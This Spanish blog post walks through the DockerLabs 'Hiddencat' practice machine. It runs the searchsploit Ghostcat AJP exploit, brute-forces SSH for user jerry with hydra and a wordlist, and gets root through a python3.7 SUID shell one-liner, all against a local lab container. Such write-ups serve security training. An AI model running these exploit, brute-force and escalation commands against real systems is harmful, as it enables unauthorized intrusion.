---
layout: post
title: "Hiddencat"
date: 2024-10-26
 13:45:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Hiddencat </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Escaneamos los puertos abiertos de la maquina.

`sudo nmap -p- -T5 --open --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/hiddencat/nmap.png){:.margin}

**2\.** Tenemos tomcat corriendo en la web, al intentar acceder nos dice acceso denegado.

`http://172.17.0.2:8080/`

![img](/notas/public/img/dockerlabs/hiddencat/80.png){:.margin}
![img](/notas/public/img/dockerlabs/hiddencat/80denied.png){:.margin}

**3\.** Buscamos si hay alguna vunerabilidad en el servidor [apache ajp](https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp), tenemos script en python y ruby; me hago una copia del script a mi maquina local.

`searchsploit ajp`

`searchsploit -m 48143`

![img](/notas/public/img/dockerlabs/hiddencat/searchsploit.png){:.margin}
![img](/notas/public/img/dockerlabs/hiddencat/searchsploitcopy.png){:.margin}

**4\.** Si ejecutamos nos muestra la forma de correr el sploit, nos dice que requiere de un objetivo o target; le proporcionamos la ip objetivo y nos devuelve un error.

`python3 48143.py`

`python3 48143.py 172.17.0.2`

![img](/notas/public/img/dockerlabs/hiddencat/pythonerror.png){:.margin}

**5\.** Necesitamos instalar python2 para que el script trabaje bien, luego de instalar python2 volvemos a correr el script, nos devuelve un mensaje donde se menciona a un tal Jerry, que podria ser un usuario.

`wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz #instalacion de python2`

`tar -xvf Python-2.7.18.tgz`

`cd Python-2.7.18`

`./configure`

`sudo make install`

`python2.7 48143.py 172.17.0.2`

![img](/notas/public/img/dockerlabs/hiddencat/python2ok.png){:.margin}

**6\.** Hacemos fuerza bruta al ssh, obtemos la contraseña del usuario jerry ya con esto podemos acceder por el ssh.

`hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

`ssh jerry@172.17.0.2`

![img](/notas/public/img/dockerlabs/hiddencat/hydra.png){:.margin}
![img](/notas/public/img/dockerlabs/hiddencat/sshjerry.png){:.margin}

**7\.** Buscamos binarios SUID, encontramos unos cuantos binarios con este permiso activo.

`find / -perm -4000 2>/dev/null`

![img](/notas/public/img/dockerlabs/hiddencat/find.png){:.margin}

**8\.** En esta ocasion usaremos [python3.7](https://gtfobins.github.io/gtfobins/python/#suid) para escalar privilegios.

`python3.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'`

![img](/notas/public/img/dockerlabs/hiddencat/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>